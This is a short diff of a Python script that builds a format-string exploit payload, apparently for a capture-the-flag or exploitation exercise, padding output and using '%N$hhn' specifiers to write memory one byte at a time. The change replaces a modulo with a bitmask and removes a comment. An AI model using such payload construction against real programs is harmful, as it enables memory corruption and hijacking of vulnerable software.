@@ -56,7 +56,7 @@ payload += b'%3$hhn'
 payload += b"." * (0x85 - 0x36)
 payload += b'%4$hhn'
 
-payload += b"." * ((0x04 - 0x85) % 0x100) # Note to future me: Don't mod 0xFF, it's 0x100.
+payload += b"." * ((0x04 - 0x85) & 0xFF)
 payload += b'%5$hhn'
 
 payload += b"." * (0x08 - 0x04)
